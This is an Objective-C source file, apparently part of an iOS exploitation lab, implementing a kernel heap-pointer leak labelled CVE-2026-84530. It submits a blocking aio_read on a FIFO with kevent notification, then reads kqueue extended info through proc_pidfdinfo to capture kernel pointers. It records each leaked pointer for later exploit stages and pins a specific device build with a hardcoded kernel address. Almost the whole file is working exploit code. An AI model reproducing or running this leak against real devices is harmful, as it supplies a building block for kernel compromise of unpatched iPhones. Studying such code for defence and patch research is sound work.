//
//  P063AioKqueueLeak.m
//  CVE-2026-84530 AIO kn_sdata heap disclose (HT149041).
//  Port of Lum1na Exploit/CVE_2026_84530_KASLR.m +tap BUILD aio-kevent-v2.
//  FIFO + SIGEV_KEVENT; no manual EVFILT_AIO add (EPERM). Heap ≠ kslide.
//

#import "P063AioKqueueLeak.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <aio.h>
#import <errno.h>
#import <fcntl.h>
#import <pthread.h>
#import <signal.h>
#import <stdlib.h>
#import <string.h>
#import <sys/event.h>
#import <sys/stat.h>
#import <unistd.h>

#ifndef SIGEV_KEVENT
#define SIGEV_KEVENT 4
#endif

extern int proc_pidfdinfo(int pid, int fd, int flavor, void *buffer, int buffersize);

#ifndef PROC_PIDFDKQUEUE_EXTINFO
#define PROC_PIDFDKQUEUE_EXTINFO 9
#endif

#define P063_BUILD @"p063-aio84530-v3-dumpcap"

struct audit_kevent_qos_s {
    uint64_t ident;
    int16_t filter;
    uint16_t flags;
    int32_t qos;
    uint64_t udata;
    uint32_t fflags;
    uint32_t xflags;
    int64_t data;
    uint64_t ext[4];
};

struct audit_kevent_extinfo {
    struct audit_kevent_qos_s kqext_kev;
    uint64_t kqext_sdata;
    int kqext_status;
    int kqext_sfflags;
    uint64_t kqext_reserved[2];
};

static BOOL p063_looks_kptr(uint64_t ptr) {
    return (ptr >= 0xffff000000000000ULL);
}

static BOOL p063_make_fifo(int *read_fd, int *write_fd) {
    char path[1024];
    const char *tmp = getenv("TMPDIR");
    if (!tmp) tmp = "/tmp/";
    snprintf(path, sizeof(path), "%saiofifo.%d.%u", tmp, getpid(), arc4random());
    unlink(path);
    if (mkfifo(path, 0600) != 0) return NO;
    int rfd = open(path, O_RDONLY | O_NONBLOCK);
    if (rfd < 0) {
        unlink(path);
        return NO;
    }
    int wfd = open(path, O_WRONLY | O_NONBLOCK);
    if (wfd < 0) {
        close(rfd);
        unlink(path);
        return NO;
    }
    int fl = fcntl(rfd, F_GETFL);
    if (fl >= 0) fcntl(rfd, F_SETFL, fl & ~O_NONBLOCK);
    unlink(path);
    *read_fd = rfd;
    *write_fd = wfd;
    return YES;
}

static void *p063_aio_submit(void *ctx) {
    void **args = (void **)ctx;
    struct aiocb *cb = (struct aiocb *)args[0];
    int *out_ret = (int *)args[1];
    int *out_err = (int *)args[2];
    *out_ret = aio_read(cb);
    *out_err = errno;
    return NULL;
}

static void p063_dump_kqext(void (^L)(NSString *), int kq, NSMutableArray<NSNumber *> *hits) {
    struct audit_kevent_extinfo infos[16];
    memset(infos, 0, sizeof(infos));
    errno = 0;
    int ret = proc_pidfdinfo(getpid(), kq, PROC_PIDFDKQUEUE_EXTINFO,
                             infos, (int)sizeof(infos));
    if (ret < 0) {
        L([NSString stringWithFormat:@"[*] extinfo ret=%d errno=%d", ret, errno]);
        return;
    }
    int count = ret;
    int cap = (int)(sizeof(infos) / sizeof(infos[0]));
    if (count > cap) count = cap;
    for (int i = 0; i < count; i++) {
        struct audit_kevent_extinfo *e = &infos[i];
        L([NSString stringWithFormat:
            @"[%02d] ident=0x%016llx filter=%d flags=0x%04x fflags=0x%08x "
            @"udata=0x%016llx data=0x%016llx sdata=0x%016llx status=0x%08x "
            @"sfflags=0x%08x ext={0x%016llx,0x%016llx,0x%016llx,0x%016llx}",
            i, e->kqext_kev.ident, e->kqext_kev.filter, e->kqext_kev.flags,
            e->kqext_kev.fflags, e->kqext_kev.udata,
            (uint64_t)e->kqext_kev.data, e->kqext_sdata, e->kqext_status,
            e->kqext_sfflags, e->kqext_kev.ext[0], e->kqext_kev.ext[1],
            e->kqext_kev.ext[2], e->kqext_kev.ext[3]]);
        if (e->kqext_kev.filter == -3 && p063_looks_kptr(e->kqext_sdata)) {
            L(@"      <-- HEAP kptr in kqext_sdata (not text slide, not hasKread)");
            [hits addObject:@(e->kqext_sdata)];
            [[P007Board shared] recordHeapLeak:e->kqext_sdata source:@"aio84530"];
        }
    }
}

@implementation P063AioKqueueLeak

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *path = [docs stringByAppendingPathComponent:@"p84530_aio_kqueue_log.txt"];
    int lfd = open(path.UTF8String, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    void (^L)(NSString *) = ^(NSString *line) {
        NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
        [log appendString:out];
        if (lfd >= 0) {
            const char *s = out.UTF8String;
            if (s) {
                write(lfd, s, strlen(s));
                fcntl(lfd, F_FULLFSYNC);
            }
        }
    };

    L([NSString stringWithFormat:@"=== p063 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P063_BUILD]);
    L(@"CVE-2026-84530 AIO kn_sdata leak. HT149041 iOS 26.7. Live on 23F77. Fixed 26.7/27.");
    L(@"FIFO + SIGEV_KEVENT (knote kernel-created). No EVFILT_AIO kevent add.");
    L(@"kqext_kev.data should be 0; kqext_sdata may hold aio_workq_entry*.");
    L(@"23F77 pin: cve84530_aio_workq_entry_free 0xfffffff00a285e94");
    L(@"Heap kptr is not kread32(kbase)==MH_MAGIC_64. Do not subtract static_base.");
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p063"];
    if (stop) {
        L(stop);
        if (lfd >= 0) { fcntl(lfd, F_FULLFSYNC); close(lfd); }
        return log;
    }
    L([NSString stringWithFormat:@"sku %@", [LabDeviceProfile skuName]]);

    NSMutableArray<NSNumber *> *hits = [NSMutableArray array];
    int kq = kqueue();
    L([NSString stringWithFormat:@"[*] kqueue fd=%d errno=%d", kq, kq < 0 ? errno : 0]);
    if (kq < 0) {
        L(@"[-] kqueue failed");
        goto verdict;
    }

    struct kevent timer_ch;
    EV_SET(&timer_ch, 123, EVFILT_TIMER, EV_ADD | EV_ENABLE, 0, 60000,
           (void *)0x5151515152525252ULL);
    int tr = kevent(kq, &timer_ch, 1, NULL, 0, NULL);
    L([NSString stringWithFormat:@"[*] timer knote add ret=%d errno=%d", tr, tr < 0 ? errno : 0]);
    if (tr < 0) {
        L(@"[-] timer kevent failed");
        close(kq);
        goto verdict;
    }
    L(@"[*] baseline dump (timer only, expect sdata==0):");
    p063_dump_kqext(L, kq, hits);

    int rfd = -1, wfd = -1;
    if (!p063_make_fifo(&rfd, &wfd)) {
        L([NSString stringWithFormat:@"[-] FIFO pair failed errno=%d", errno]);
        close(kq);
        goto verdict;
    }
    L([NSString stringWithFormat:@"[*] fifo r=%d w=%d", rfd, wfd]);

    char *buffer = calloc(1, 16);
    if (!buffer) {
        close(rfd); close(wfd); close(kq);
        goto verdict;
    }

    struct aiocb aio_ctx;
    memset(&aio_ctx, 0, sizeof(aio_ctx));
    aio_ctx.aio_fildes = rfd;
    aio_ctx.aio_buf = buffer;
    aio_ctx.aio_nbytes = 16;
    aio_ctx.aio_offset = 0;
    aio_ctx.aio_sigevent.sigev_notify = SIGEV_KEVENT;
    aio_ctx.aio_sigevent.sigev_signo = kq;
    aio_ctx.aio_sigevent.sigev_value.sival_ptr = (void *)0x4141414142424242ULL;

    int ar = -2;
    int ar_errno = 0;
    void *submit_ctx[3];
    submit_ctx[0] = &aio_ctx;
    submit_ctx[1] = &ar;
    submit_ctx[2] = &ar_errno;
    pthread_t th;
    pthread_create(&th, NULL, p063_aio_submit, (void *)submit_ctx);

    /* v3: stop polling once the leak is captured. v2 polled the full 100
       iterations (~10 ms apart) while the aio_read thread was still blocked
       on the FIFO — the same 2-knote block repeated 100+ times in the log
       (17:37 tap). The AIO knote's sdata is stable across samples, so 3
       captures prove the leak; the rest is spam. */
    for (int i = 0; i < 100 && hits.count < 3; i++) {
        p063_dump_kqext(L, kq, hits);
        usleep(10000);
    }
    L([NSString stringWithFormat:@"[*] aio_read thread ret=%d errno=%d", ar, ar_errno]);

    char unblock[16];
    memset(unblock, 'Z', sizeof(unblock));
    write(wfd, unblock, sizeof(unblock));
    pthread_join(th, NULL);
    usleep(10000);

    L(@"[*] post-completion dump:");
    p063_dump_kqext(L, kq, hits);

    struct kevent ev;
    memset(&ev, 0, sizeof(ev));
    struct timespec ts = {0, 0};
    int n = kevent(kq, NULL, 0, &ev, 1, &ts);
    L([NSString stringWithFormat:
        @"[*] drain kevent n=%d errno=%d ident=0x%016llx filter=%d flags=0x%04x data=%lld udata=0x%016llx",
        n, n < 0 ? errno : 0, (uint64_t)ev.ident, ev.filter, ev.flags,
        (long long)ev.data, (uint64_t)ev.udata]);

    aio_return(&aio_ctx);
    free(buffer);
    close(rfd);
    close(wfd);
    close(kq);

verdict:
    L(@"=== VERDICT ===");
    L([NSString stringWithFormat:@"heap hits=%lu (aio_workq_entry* class). hasKread stays NO.",
       (unsigned long)hits.count]);
    if (hits.count > 0) {
        L(@"sdata held a kernel-range pointer. HEAP leak, not kreadbuf, not kslide.");
    } else {
        L(@"No kernel-range sdata this tap. Class still OPEN (one angle).");
    }
    if (lfd >= 0) {
        fcntl(lfd, F_FULLFSYNC);
        close(lfd);
    }
    return log;
}

@end
